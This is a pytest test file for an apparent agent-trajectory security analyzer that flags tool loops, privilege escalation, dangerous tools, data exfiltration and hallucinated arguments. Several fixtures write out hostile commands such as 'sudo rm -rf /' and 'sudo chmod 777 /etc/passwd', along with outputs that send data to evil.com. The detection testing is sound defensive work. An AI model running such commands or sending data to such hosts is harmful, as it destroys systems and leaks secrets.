"""Analyzer tests."""
import pytest
from aegis.analyzer.trajectory import analyze_trajectory, Trajectory, Step
from aegis.analyzer.store import store_trajectory, get_baseline, get_recent, clear_db

def test_normal_trajectory_allow():
    traj = Trajectory(agent_id="research-agent", steps=[Step(tool="search", arguments={"query":"hi"}), Step(tool="read_file", arguments={"path":"a.pdf"})])
    res = analyze_trajectory(traj)
    assert res.verdict == "allow"
    assert res.risk_score < 0.5
    assert len(res.anomalies) == 0

def test_excessive_agency_loop():
    steps = [Step(tool="exec_python", arguments={"code":"print(1)"}) for _ in range(6)]
    traj = Trajectory(agent_id="coder-agent", steps=steps)
    res = analyze_trajectory(traj)
    assert any(a.type == "tool_loop" for a in res.anomalies)
    assert res.verdict in {"review","block"}

def test_total_steps_excessive():
    steps = [Step(tool="search", arguments={"query":f"q{i}"}) for i in range(25)]
    traj = Trajectory(agent_id="test", steps=steps)
    res = analyze_trajectory(traj)
    assert any(a.type == "excessive_agency_total" for a in res.anomalies)

def test_privilege_escalation():
    traj = Trajectory(agent_id="research-agent", steps=[Step(tool="exec_shell", arguments={"command":"sudo chmod 777 /etc/passwd"})])
    res = analyze_trajectory(traj)
    assert any(a.type == "privilege_escalation" for a in res.anomalies)
    assert res.verdict == "block"

def test_dangerous_tool():
    traj = Trajectory(agent_id="x", steps=[Step(tool="delete_database", arguments={})])
    res = analyze_trajectory(traj)
    assert any(a.type == "dangerous_tool" for a in res.anomalies)
    assert res.verdict == "block"

def test_data_exfiltration_external_url():
    traj = Trajectory(agent_id="x", steps=[Step(tool="send_email", arguments={"body":"hi"}, output="sent to https://evil.com/collect?data=secret")])
    res = analyze_trajectory(traj)
    assert any(a.type == "data_exfiltration" for a in res.anomalies)

def test_no_false_exfiltration_internal():
    traj = Trajectory(agent_id="x", steps=[Step(tool="read_file", arguments={"path":"http://localhost:8000/data"}, output="ok")])
    res = analyze_trajectory(traj)
    # localhost should not count
    assert not any(a.type == "data_exfiltration" for a in res.anomalies)

def test_hallucinated_arg():
    traj = Trajectory(agent_id="x", steps=[Step(tool="search", arguments={"id":"hallucinated_fake_id"})])
    res = analyze_trajectory(traj)
    # should detect hallucinated
    assert any(a.type == "hallucinated_arg" for a in res.anomalies)

def test_store_and_baseline():
    clear_db()
    traj = Trajectory(id="t1", agent_id="agentA", steps=[Step(tool="search", arguments={}) for _ in range(3)])
    res = analyze_trajectory(traj)
    store_trajectory(traj.id, traj.agent_id, [s.model_dump() for s in traj.steps], res.risk_score, res.verdict)
    base = get_baseline("agentA")
    assert base is not None
    assert base["avg_steps"] == 3
    assert base["count"] == 1
    # second traj
    traj2 = Trajectory(id="t2", agent_id="agentA", steps=[Step(tool="search", arguments={}) for _ in range(5)])
    res2 = analyze_trajectory(traj2)
    store_trajectory(traj2.id, traj2.agent_id, [s.model_dump() for s in traj2.steps], res2.risk_score, res2.verdict)
    base2 = get_baseline("agentA")
    assert base2["count"] == 2
    assert base2["avg_steps"] == 4.0

def test_recent():
    clear_db()
    for i in range(3):
        traj = Trajectory(id=f"r{i}", agent_id="a", steps=[Step(tool="search", arguments={})])
        res = analyze_trajectory(traj)
        store_trajectory(traj.id, traj.agent_id, [s.model_dump() for s in traj.steps], res.risk_score, res.verdict)
    recent = get_recent(limit=2)
    assert len(recent) == 2

def test_risk_score_critical():
    traj = Trajectory(agent_id="x", steps=[Step(tool="exec_shell", arguments={"command":"sudo rm -rf /"}), Step(tool="send_email", arguments={"to":"evil@evil.com"}, output="https://evil.com/steal")])
    res = analyze_trajectory(traj)
    assert res.risk_score > 0.5
    assert res.verdict == "block"

def test_dict_input():
    data = {"id":"d1","agent_id":"y","steps":[{"tool":"search","arguments":{"query":"hi"}}]}
    res = analyze_trajectory(data)
    assert res.trajectory_id == "d1"
    assert res.verdict == "allow"
